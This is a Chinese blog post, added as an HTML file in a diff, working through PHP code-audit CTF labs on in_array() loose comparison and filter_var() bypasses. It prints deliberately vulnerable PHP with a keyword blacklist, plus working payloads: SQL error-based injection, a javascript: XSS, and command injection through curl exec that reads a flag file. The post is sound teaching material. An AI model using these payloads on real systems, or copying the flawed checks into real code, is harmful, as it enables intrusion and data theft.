@@ -1,0 +1,269 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>php代码审计-函数篇_Day1、2 - xiaofeiji&#39;s Blog</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Xiaofeiji,"> 
+    <meta name="description" content="Day1关于不正确使用in_array()检测文件上传文件名导致的任意文件上传123456789101112131415&amp;lt;?php $white_list = range(1,24);if(!,"> 
+    <meta name="author" content="John Doe"> 
+    <link rel="alternative" href="atom.xml" title="xiaofeiji&#39;s Blog" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.jpg"> 
+    
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+   <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+   </script>
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body class="loading">
+    <span id="config-title" style="display:none">xiaofeiji&#39;s Blog</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">php代码审计-函数篇_Day1、2</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">php代码审计-函数篇_Day1、2</h1>
+        <div class="stuff">
+            <span>一月 27, 2022</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E5%85%B3%E4%BA%8E%E5%87%BD%E6%95%B0/" rel="tag">代码审计-关于函数</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <h3 id="Day1"><a href="#Day1" class="headerlink" title="Day1"></a>Day1</h3><h4 id="关于不正确使用in-array-检测文件上传文件名导致的任意文件上传"><a href="#关于不正确使用in-array-检测文件上传文件名导致的任意文件上传" class="headerlink" title="关于不正确使用in_array()检测文件上传文件名导致的任意文件上传"></a>关于不正确使用in_array()检测文件上传文件名导致的任意文件上传</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="variable">$white_list</span> = range(<span class="number">1</span>,<span class="number">24</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!in_array(<span class="variable">$file</span>,<span class="variable">$white_list</span>))&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;请上传正确的文件格式!&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">执行文件上传操作;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>在代码中，由于没有将in_array()的第三个参数设置为true，导致可以进行弱比较，也就是说，当任意上传文件7shell.php时，in_array()会将其转化为7，与$while_list进行比较，存在于$while_list中，因此可以导致任意文件的上传。这是因为没有将in_array()第三个参数设置为true导致的。</p>
+<h4 id="in-array-函数"><a href="#in-array-函数" class="headerlink" title="in_array()函数"></a>in_array()函数</h4><p><img src="clipboard.png" alt="img"></p>
+<p>查看in_array()的官方文档说明，该函数是用来检查$needle是否存在于$haytack数组中的。</p>
+<p>如果第三个参数$stict没有被设置的话将使用比较宽松的比较，即php的弱比较类型。</p>
+<p><img src="clipboard-1643368159684.png" alt="img"></p>
+<p>如果第三个参数$stict被设置为true的话，将会比较$needle和$haystack的类型。</p>
+<h4 id="CTF题目"><a href="#CTF题目" class="headerlink" title="CTF题目"></a>CTF题目</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line"><span class="variable">$conn</span> = <span class="keyword">new</span> mysqli(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;connect_error) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;连接失败: &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT COUNT(*) FROM users&quot;</span>;</span><br><span class="line"><span class="variable">$whitelist</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;query(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="variable">$row</span> = <span class="variable">$result</span>-&gt;fetch_assoc();</span><br><span class="line">    <span class="variable">$whitelist</span> = range(<span class="number">1</span>, <span class="variable">$row</span>[<span class="string">&#x27;COUNT(*)&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span> = stop_hack(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!in_array(<span class="variable">$id</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;id <span class="subst">$id</span> is not in whitelist.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;query(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="variable">$row</span> = <span class="variable">$result</span>-&gt;fetch_assoc();</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&lt;table border=&#x27;1&#x27;&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$row</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;tr&gt;&lt;td&gt;&lt;center&gt;<span class="subst">$key</span>&lt;/center&gt;&lt;/td&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;td&gt;&lt;center&gt;<span class="subst">$value</span>&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/table&gt;&lt;/center&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$conn</span>-&gt;error);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"> <span class="comment">//config.php</span></span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;fire&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;fire&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;day1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">stop_hack</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$pattern</span> = <span class="string">&quot;insert|delete|or|concat|concat_ws|group_concat|join|floor|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile|dumpfile|sub|hex|file_put_contents|fwrite|curl|system|eval&quot;</span>;</span><br><span class="line">	<span class="variable">$back_list</span> = explode(<span class="string">&quot;|&quot;</span>,<span class="variable">$pattern</span>);</span><br><span class="line">	<span class="keyword">foreach</span>(<span class="variable">$back_list</span> <span class="keyword">as</span> <span class="variable">$hack</span>)&#123;</span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">&quot;/<span class="subst">$hack</span>/i&quot;</span>, <span class="variable">$value</span>))</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;<span class="subst">$hack</span> detected!&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>代码中采用in_array()判断白名单，并且没有设置第三个参数：</p>
+<p>if (!in_array($id, $whitelist)) {</p>
+<p>​    die(“id $id is not in whitelist.”);</p>
+<p>}</p>
+<p>利用这个点可以尝试进行SQL注入：</p>
+<p>1 and sleep(3);</p>
+<p>发现回显延迟。</p>
+<p>黑名单中过滤了很多的关键字，比如or(导致information无法用)、concat等，考虑报错注入，但是需要绕过concat，尝试搜索其他的连接查询的函数：</p>
+<p><img src="clipboard-1643368260212.png" alt="img"></p>
+<p>这里讨论make_set()的用法问题：</p>
+<p>select make_set(‘1’,’a’,’b’,’c’,’d’);</p>
+<p>在mysql中使用make_set，函数的第一个参数为字符串，后面的可以理解为回显位。当第一个参数为1时，根据其二进制的反过来的值，如果对应后面的位置为1的，将1上的内容显示出来：1的二进制为0001，反过来为1000，因此显示的为1所在位置的值a：</p>
+<p><img src="clipboard-1643368282153.png" alt="img"></p>
+<p>再比如2,2的二进制表示为0010，倒过来为0100，所以显示位为第二位,取对应值m:</p>
+<p><img src="clipboard-1643368300677.png" alt="img"></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">1 and updatexml(1,make_set(3,&#x27;~&#x27;,(select database())),1);</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="clipboard-1643368332218.png" alt="img"></p>
+<p>这里尝试使用无列名注入绕过information，但是在使用的时候返回空，所以这里就直接尝试获取flag了。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and updatexml(1,make_set(3,&#x27;~&#x27;,(select flag from flag)),1)</span><br></pre></td></tr></table></figure>
+
+<p><img src="clipboard-1643368355684.png" alt="img"></p>
+<h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p><a target="_blank" rel="noopener" href="https://www.dazhuanlan.com/qwelf/topics/1100745">https://www.dazhuanlan.com/qwelf/topics/1100745</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day1/files/README.md">https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day1/files/README.md</a></p>
+<hr>
+<h3 id="Day2"><a href="#Day2" class="headerlink" title="Day2"></a>Day2</h3><h4 id="filter-var函数缺陷"><a href="#filter-var函数缺陷" class="headerlink" title="filter_var函数缺陷"></a>filter_var函数缺陷</h4><p>filter_var — 使用特定的过滤器过滤一个变量</p>
+<p><img src="clipboard-1643368426740.png" alt="img"></p>
+<p>第一个参数表示要过滤的内容；</p>
+<p>第二个参数表示的是要使用的过滤器的id，也可以直接写值。</p>
+<p>查看filter参数都定义了哪些值：</p>
+<p><img src="clipboard-1643368440181.png" alt="img"></p>
+<p>在菜鸟教程中可以看到定义了很多的值，像对url的过滤、email的过滤等。</p>
+<p>在这里我们找到关于url的过滤选择器：</p>
+<p><img src="clipboard-1643368458704.png" alt="img"></p>
+<p>验证一个url是否符合要求。</p>
+<p><strong>用下面一段demo代码来解释：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">   <span class="variable">$url</span> = filter_var(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>],FILTER_VALIDATE_URL);</span><br><span class="line">   var_dump(<span class="variable">$url</span>);</span><br><span class="line">   <span class="variable">$url</span> = htmlspecialchars(<span class="variable">$url</span>);</span><br><span class="line">   var_dump(<span class="variable">$url</span>);</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;<span class="subst">$url</span>&#x27;&gt;Next slide &lt;/a&gt;&quot;</span>;</span><br><span class="line">   </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>首先第二行中使用了filter_var()函数对传进来的url进行过滤，url的内容可控，在最后一行，将url拼接到a标签中，点击跳转。</p>
+<p><img src="clipboard-1643368485195.png" alt="img"></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?url=javascript://comment%250aalert(1);</span><br><span class="line">这是的payload用了%25，其实是%进行了url编码，%0a是换行符，//是在js中起到单行注释的作用，通过后面的%0a，就成功将alert(1)换到了不同行，因此alert函数能成功执行。用url编码成%25是因为get传递参数的时候，会先将其解析为javascript://comment%0aalert(1);然后传入到第二行代码中输出。</span><br></pre></td></tr></table></figure>
+
+
+
+<p>当我们使用JavaScript伪协议 时，整体构造符合filter_var()函数中<em>FILTER_VALIDATE_URL</em>)</p>
+<p>过滤器对url的要求，并且在js中//起到单行注释的作用，会将后面的comment注释掉，%0a表示换行符，将后面的alert()函数换行，因此与//单行注释不在同一行，写入标签时，alert函数被执行，造成xss漏洞。</p>
+<h4 id="CTF题目-1"><a href="#CTF题目-1" class="headerlink" title="CTF题目"></a>CTF题目</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$url</span>) &amp;&amp; filter_var(<span class="variable">$url</span>, FILTER_VALIDATE_URL))&#123;</span><br><span class="line">    <span class="variable">$site_info</span> = parse_url(<span class="variable">$url</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/sec-redclub.com$/&#x27;</span>,<span class="variable">$site_info</span>[<span class="string">&#x27;host&#x27;</span>]))&#123;</span><br><span class="line">        exec(<span class="string">&#x27;curl &quot;&#x27;</span>.<span class="variable">$site_info</span>[<span class="string">&#x27;host&#x27;</span>].<span class="string">&#x27;&quot;&#x27;</span>, <span class="variable">$result</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&lt;h1&gt;You have curl <span class="subst">&#123;$site_info[&#x27;host&#x27;]&#125;</span> successfully!&lt;/h1&gt;&lt;/center&gt;</span></span><br><span class="line"><span class="string">              &lt;center&gt;&lt;textarea rows=&#x27;20&#x27; cols=&#x27;90&#x27;&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> implode(<span class="string">&#x27; &#x27;</span>, <span class="variable">$result</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;&lt;center&gt;&lt;h1&gt;Error: Host not allowed&lt;/h1&gt;&lt;/center&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&lt;h1&gt;Just curl sec-redclub.com!&lt;/h1&gt;&lt;/center&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">          &lt;center&gt;&lt;h3&gt;For example:?url=http://sec-redclub.com&lt;/h3&gt;&lt;/center&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"> <span class="comment">// f1agi3hEre.php</span></span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;HRCTF&#123;f1lt3r_var_1s_s0_c00l&#125;&quot;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>parse_url()：解析 URL，返回其组成部分</p>
+<p><img src="clipboard-1643368543106.png" alt="img"></p>
+<p>如果第二个参数指定host的话，则返回host部分。</p>
+<p>exec(): 执行外部的命令</p>
+<p><img src="clipboard-1643368562417.png" alt="img"></p>
+<p>第一个参数为所要执行的命令，第二个参数如果存在，则存放执行命令后返回的结果，以数组的形式存在。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在代码中，首先使用filter_var判断url的规范，然后使用parse_url函数对url进行解析，取解析到的host部分$site_info[&#x27;host&#x27;]该部分内容必须满足正则匹配以sec-redclub.com作为结束字符。满足以上条件，将参数$site_info[&#x27;host&#x27;]带入exec中执行命令，然后通过echo输出命令执行结果$result。</span><br></pre></td></tr></table></figure>
+
+<p>exec执行多条命令可以使用管道符进行拼接，这里我使用的是win环境：</p>
+<p>windows下的命令连接符:&amp;、&amp;&amp;（还有|、||）</p>
+<p>&amp;:</p>
+<p>&amp;前面的语句为假，则执行&amp;后的语句，&amp;前的语句为真，则&amp;前后语句都执行。</p>
+<p>&amp;&amp;:</p>
+<p>&amp;&amp;前面的语句为假，则直接报错，后面的语句也不执行；&amp;&amp;前面的语句为真，则前后语句都执行。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">首先需要绕过filter_var函数的检验，可以构造javascript://或者0://都可以，这里我选用javascript://。最后使用sec-redclub.com作为结束字符绕过正则匹配：JavaScript://[任意内容]sec-redclub.com</span><br><span class="line">这里直接使用type指定文件，type=flag.php，使用&quot;对exec(&#x27;curl &quot;&#x27;.$site_info[&#x27;host&#x27;].&#x27;&quot;&#x27;, $result);语句进行拼接：</span><br><span class="line">?url=javascript://&quot;&amp;type=flag.php&amp;&amp;&quot;sec-redclub.com</span><br><span class="line">得到exec(curl &quot;javascript://&quot;&amp;type=flag.php&amp;&amp;&quot;sec-redclub.com&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>执行读取文件命令，得到flag：</p>
+<p><img src="clipboard-1643368641686.png" alt="img"></p>
+<h4 id="参考文章-1"><a href="#参考文章-1" class="headerlink" title="参考文章"></a>参考文章</h4><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38850916/article/details/121332722">https://blog.csdn.net/qq_38850916/article/details/121332722</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43818995/article/details/104165124">https://blog.csdn.net/weixin_43818995/article/details/104165124</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day2/files/README.md">https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day2/files/README.md</a></p>
+<ul>
+<li>以上代码题目代码均来自红日安全代码审计项目。</li>
+</ul>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable=''
+        data-ae=''
+        data-ci=''
+        data-cs=''
+        data-r='xiaofeiji-77.github.io'
+        data-o='xiaofeiji-77'
+        data-a='xiaofeiji-77'
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Day1"><span class="toc-number">1.</span> <span class="toc-text">Day1</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E%E4%B8%8D%E6%AD%A3%E7%A1%AE%E4%BD%BF%E7%94%A8in-array-%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E5%90%8D%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.1.</span> <span class="toc-text">关于不正确使用in_array()检测文件上传文件名导致的任意文件上传</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#in-array-%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.</span> <span class="toc-text">in_array()函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CTF%E9%A2%98%E7%9B%AE"><span class="toc-number">1.3.</span> <span class="toc-text">CTF题目</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">1.4.</span> <span class="toc-text">参考文章</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Day2"><span class="toc-number">2.</span> <span class="toc-text">Day2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#filter-var%E5%87%BD%E6%95%B0%E7%BC%BA%E9%99%B7"><span class="toc-number">2.1.</span> <span class="toc-text">filter_var函数缺陷</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CTF%E9%A2%98%E7%9B%AE-1"><span class="toc-number">2.2.</span> <span class="toc-text">CTF题目</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0-1"><span class="toc-number">2.3.</span> <span class="toc-text">参考文章</span></a></li></ol></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+   
+</body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+
+
+<!--单击显示文字-->
+<script type="text/javascript" src="/js/click_show_text.js"></script>
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<script src="https://cdn.jsdelivr.net/gh/wallleap/cdn/js/canvas-nest.min.js"></script>
+</html>
